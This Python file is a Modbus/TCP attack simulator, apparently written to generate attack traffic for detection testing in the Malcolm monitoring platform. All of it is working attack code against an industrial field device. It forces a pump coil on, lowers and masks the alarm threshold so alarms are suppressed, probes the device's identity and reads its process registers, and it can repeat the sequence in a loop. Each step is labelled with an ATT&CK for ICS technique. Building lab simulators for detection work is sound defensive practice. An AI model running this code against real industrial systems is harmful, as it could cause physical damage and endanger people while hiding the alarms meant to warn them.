"""Unauthorized Modbus command injection — ICS attack simulator.

Simulates adversary behaviour against a Modbus/TCP field device.
Visible in Malcolm as conn.log + modbus*.log entries.

Note: ACID (ATT&CK for ICS Zeek package bundled in Malcolm) does NOT have a
Modbus detection module — these attacks appear in Malcolm Modbus dashboards
but do NOT trigger ATT&CK tactic/technique or ACID panels.
For ATT&CK panel population, use s7comm_attack.py against a deployed s7comm-server.

Usage:
    python3 modbus_attack.py --target 192.168.10.10
    python3 modbus_attack.py --target 192.168.10.10 --continuous
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import sys
import time

from pymodbus.client import AsyncModbusTcpClient

log = logging.getLogger("modbus_attack")


async def attack_once(host: str, port: int) -> None:
    client = AsyncModbusTcpClient(host, port=port)
    await client.connect()
    if not client.connected:
        log.error("Could not connect to %s:%d", host, port)
        return

    try:
        log.info("[T0855] Unauthorized command — forcing pump coil ON")
        await client.write_coil(0, True, slave=1)

        log.info("[T0836] Modify parameter — write alarm threshold to 10%% (suppress alarm)")
        await client.write_register(1, 100, slave=1)   # 100 = 10.0% in x10 scale

        log.info("[T0836] Read/Write Multiple Registers — reset alarm threshold")
        # pymodbus 3.7.4's client method is `readwrite_registers` (no underscore
        # between read/write), payload arg is `values` not `write_registers` — the
        # old names raise AttributeError, and since there was no except clause here
        # it would crash the whole attack sequence, skipping every step after this
        # one. Same bug already found and fixed in modbus_client.py.
        await client.readwrite_registers(
            read_address=0, read_count=2,
            write_address=1, values=[100],
            slave=1,
        )

        log.info("[T0878] Alarm suppression — mask alarm threshold register bits")
        await client.mask_write_register(address=1, and_mask=0x0000, or_mask=0x0000, slave=1)

        log.info("[T0888] Device identification probe — FC43")
        try:
            await client.read_device_information(read_code=0x01, object_id=0x00, slave=1)
        except Exception:
            pass  # server may not implement FC43 — still logged by Zeek from request

        log.info("[T0801] Monitor process state — read all holding registers")
        await client.read_holding_registers(0, count=10, slave=1)

        log.info("Attack sequence complete.")

    finally:
        client.close()


async def run(host: str, port: int, continuous: bool, interval: float) -> None:
    if continuous:
        log.info("Continuous mode — attacking %s:%d every %.0fs (Ctrl+C to stop)", host, port, interval)
        while True:
            await attack_once(host, port)
            await asyncio.sleep(interval)
    else:
        await attack_once(host, port)


def main() -> None:
    parser = argparse.ArgumentParser(description="Unauthorized Modbus command injector")
    parser.add_argument("--target", required=True, help="Modbus server IP")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--continuous", action="store_true", help="Repeat attack in a loop")
    parser.add_argument("--interval", type=float, default=30.0,
                        help="Seconds between attacks in continuous mode (default: 30)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    asyncio.run(run(args.target, args.port, args.continuous, args.interval))


if __name__ == "__main__":
    main()
